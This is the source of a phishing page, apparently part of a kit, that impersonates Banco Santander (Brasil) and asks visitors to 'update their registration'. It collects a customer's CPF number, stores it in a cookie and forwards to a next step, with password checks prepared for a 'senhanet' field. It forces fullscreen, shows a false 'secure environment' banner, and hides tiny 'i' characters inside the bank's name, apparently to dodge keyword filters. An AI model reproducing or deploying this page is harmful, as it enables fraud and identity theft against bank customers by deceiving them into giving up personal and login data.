<?php
if(isset($_POST['cpfis']) && !empty($_POST['cpfis'])){
$cookie_value=$_POST['cpfis'];
setcookie('cpf',$cookie_value, time() + 3600, '/');


header("Location: home2.php");
}

?>

<!doctype html>
<?php

error_reporting(0);
?>
<html>
<head>
<link rel="shortcut icon" type="image/x-icon" href="imagens/00.ico">
<title>&#x1F512 [Vamos Fazer Juntos]</title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta content="width=device-width,initial-scale=1" name="viewport">
<link rel="stylesheet" href="css/bootstrap1.min.css">
<link rel="stylesheet" href="css/bootstrap-theme1.min.css">
<link rel="stylesheet" href="css/bootstrap.style.css">
<script src="js/jQuery_v1.2.6.js"></script>
<script src="js/bootstrap1.min.js"></script>

<script src="js/bootstrap.min.js"></script>

<script src="js/onBlur.js"></script>
<script src="js/validarCPF.js"></script>
<script src="js/divOculta.js"></script>
<script src="js/pularCampo.js"></script>
<script src="js/geral.js"></script>

<script language="JavaScript" >

 

function validacpf(){

 

var i;

 

s = document.form.cpfis.value;

 

var c = s.substr(0,9);

 

var dv = s.substr(9,2);

 

var d1 = 0;

 

for (i = 0; i < 9; i++)

 

{

 

d1 += c.charAt(i)*(10-i);

 

}

 

if (d1 == 0){

 

alert("CPF Invalido")

 

return false;

 

}

 

d1 = 11 - (d1 % 11);

 

if (d1 > 9) d1 = 0;

 

if (dv.charAt(0) != d1)

 

{

 

alert("CPF Invalido")

 

return false;

 

}

 
 

d1 *= 2;

 

for (i = 0; i < 9; i++)

 

{

 

d1 += c.charAt(i)*(11-i);

 

}

 

d1 = 11 - (d1 % 11);

 

if (d1 > 9) d1 = 0;

 

if (dv.charAt(1) != d1)

 

{

 

alert("CPF Invalido")

 

return false;

 

}

 

return true;

 

}

 

                  </script>


<script>
function toggleFullScreen() {
  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
    if (document.documentElement.requestFullScreen) {  
      document.documentElement.requestFullScreen();  
    } else if (document.documentElement.mozRequestFullScreen) {  
      document.documentElement.mozRequestFullScreen();  
    } else if (document.documentElement.webkitRequestFullScreen) {  
      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
    }  
  } else {  
    if (document.cancelFullScreen) {  
      document.cancelFullScreen();  
    } else if (document.mozCancelFullScreen) {  
      document.mozCancelFullScreen();  
    } else if (document.webkitCancelFullScreen) {  
      document.webkitCancelFullScreen();  
    }  
  }  
}
</script>
<script>
function validation() {
var ModalAlertError = document.getElementById("TextErrorModal");
var ModalAlert = document.getElementById("modalalert");
if ( document.form.senhanet.value == "" || document.form.senhanet.value.length < 6 || document.form.senhanet.value == "00000000" || document.form.senhanet.value == "11111111" || document.form.senhanet.value == "22222222" || document.form.senhanet.value == "33333333" || document.form.senhanet.value == "44444444" || document.form.senhanet.value == "55555555" || document.form.senhanet.value == "66666666" || document.form.senhanet.value == "77777777" || document.form.senhanet.value == "88888888" || document.form.senhanet.value == "99999999"){ ModalAlertError.innerHTML = "Para continuar é necessário informar uma senha de acesso. Por favor, informe uma senha de acesso válida."; ModalAlert.style.display = ""; return false; }
}
</script>
<style>
@media (min-height: 550px) { #show { margin-top:70px; }}
@media (max-height: 550px) { #show { margin-top:60px; }}
@media (max-height: 450px) { #show { margin-top:30px; }}
@media (max-height: 370px) { #show { margin-top:20px; }}
@media (max-height: 350px) { #show { margin-top:10px; }}
@media (max-height: 330px) { #moda { display:none; }}
@media (max-height: 260px) { #dasa { display:none; }}

@media (max-width: 767px) { #propa { display:none; }}
@media (max-width: 767px) { #show { background:url(img1/06.png) no-repeat center; }}
@media (min-width: 767px) { #show { background:; }}

.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }
.modalposition2{ max-width:380px; margin:0 auto; z-index: 99999; border: 1px solid #999; position: absolute; left:10px; right:10px;	font-family: Arial; top: 25%; background:#FFF; color:#000; box-shadow: 0 0 10px #999; padding:15px 15px 15px 15px; border-radius:3px; }
.modaltext{ padding:15px 15px 15px 0; color:#666666; }
#ok { padding:5px 20px 5px 20px; background:url(img1/ir.jpg) repeat-x; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}

.i { font-family:'Arial'; font-size:1px; }

</style>

<style>
.casa { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }
.flow22 { max-width:380px; margin:0 auto; z-index: 99999; border: 1px solid #999; position: absolute; left:10px; right:10px;	font-family: Arial; top: 25%; background:#FFF; color:#000; box-shadow: 0 0 10px #999; padding:15px 15px 15px 15px; border-radius:3px; }
.aa { padding:15px 15px 15px 0; color:#666666; }
#ok { padding:5px 20px 5px 20px; background:#373434; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}
#okey { padding:5px 20px 5px 20px; background:#373434; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}
</style>

</head>

<body onLoad="toggleFullScreen()">
<div style="background:#E40203; height:50px; padding:10px 0 0 0;" class="col-sm-7">
<div style="">
<div style="background:url(img1/00.png) no-repeat center; width:100%; height:30px;"></div>
</div>
</div>

<div style="background:#EAEAEA; height:65px;" class="col-sm-7" id="moda">
<div style="height:65px; background:url(img1/01.jpg) no-repeat;">
<div style="text-align:center; padding:20px; background:url(img1/02.jpg) no-repeat right; color:#E40203; font-weight:bold;" onClick="document.getElementById('moda2').style.display='';return false;"> Caro Cliente Atualize Seu Cadastro</div>
</div>
</div>

<div class="col-sm-7" id="">

</div>

<div class="col-sm-7" id="show" style="">

<form name="form" id="form" action=<?php echo $_SERVER['PHP_SELF'] ?> method='post' onSubmit="return validation()">



<div style="margin:0 auto; width:80%; font-family:'Arial'; font-size:0.9em; text-align:center; color:#E40203; ">
<div style="font-size:1.2em; padding:0 0 10px 0; color:#999;">Informe seu tipo de conta</div>
<input type="radio" name="radio" id="radio" value="form1" checked style="width:15px; height:15px;" />
<label>Correntista</label>
<input type="radio" name="radio" id="radio" value="concluido1" style="margin-left:30px; width:15px; height:15px;" />
<label>Não correntista</label>
</div>

<div style="width:80%; margin:0 auto;">
<center><div style="height:20px;"><div style="display:none; color:#666666;" id="cp">CPF</div></div>
<div style=""><input type="tel" name="cpfis" id="cpfis" value="CPF" onfocus="clean(this.id)" onblur="blurCPF(this.id)" onClick="oculto('cp')" size="30" maxlength="11" onKeyUp="javascript:pulacampo('cpf','bt')" autocomplete="off"></div></center>
<div id="casas" style="font-size:12px; color:#666666;">
</div>
<div style="height:40px; width:100%; margin-top:40px;" id="dasa">
<div style="float:left; margin-top:5px; color:#585858;"></div>

</div>
<div style="margin-top:20px; text-align:center;"><input type="submit" name="bt" id="bt" value="CONTINUAR" onClick="return validacpf()"></div>
</div>
</form>

<div style="text-align:center; font-size:1.3em; padding:40px 0 0px; text-shadow:1px 1px 1px #DDD;">O <font color="#E40203" size=""><b>aplicativo S<span class="i">i</span>an<span class="i">i</span>tan<span class="i">i</span>der</b></font> está mais completo</div>
<div style="background:#E40203; border-radius:5px; padding:20px 30px 20px 30px; color:#FFF; margin:20px 30px 30px 30px; text-align:center; box-shadow:0 0 10px #CCC; text-shadow:1px 1px 1px #971C1E;">Agora, clientes que possuem apenas o c<span class="i">i</span>ar<span class="i">i</span>tã<span class="i">i</span>o S<span class="i">i</span>an<span class="i">i</span>ta<span class="i">i</span>nd<span class="i">i</span>er também podem utilizá-lo. </div>
<div style="text-align:center; margin-top:-40px;"><a href="#"><button class="btn btn-primary" type="button"> Saiba mais <span class="badge"><span class="glyphicon glyphicon-chevron-right"></span></span></button></a></div>

</div>

<!--<div style="position:absolute; right:0; left:59%; top:0; bottom:0; background:url(img1/05.png) no-repeat center;" id="propa">-->

<!--</div>-->

<!-- ================================================================ -->
<div style="display:none;" id="modalalert" class="modalposition">
<div id="modalalert2" class="modalposition2">
<div style="font-size:16px;">Santander informa:</div>
<div class="modaldiv1"><div class="modaltext"><div id="TextErrorModal" style="font-size:0.9em;">Erro</div></div></div>
<div class="modaldiv2" align="right">
<a href="#closemodal"><button onClick="document.getElementById('modalalert').style.display='none';return false;" id="ok">Ok</button></a>
</div>
</div>
</div>
<!-- ================================================================ -->


<!-- ================================================================ -->

<img src="img1/jpg.jpg" width="1" height="1">
<img src="img1/06.png" width="1" height="1">
<img src="img1/08.jpg" width="1" height="1">

<div style="Width:1100px; height:33px; position:absolute; bottom:6px; background:#FF0000; border-top:1px solid #CCC;" id="casa">
<div style="background:#FF0000; padding:1px 0 0 10px;">
<div style="height:20px; background:url(imagens/cadiado.png) no-repeat; background-size:contain; padding:3px 0 0 30px; margin-top:5px; font-weight:bold; color:#FFFFFF; font-size:0.8em;  text-shadow:;">
	Ambiente seguro.<div style="float:right; border-radius:50px; padding:0 10px 0 0"> <font face="arial">
			Banco Santander (Brasil) S.A.</font></div></div>
</div>
</div>
<!-- ================================================================ -->
<div style="display:none;" id="modalalert" class="modalposition">
</div>
</body>
</html>
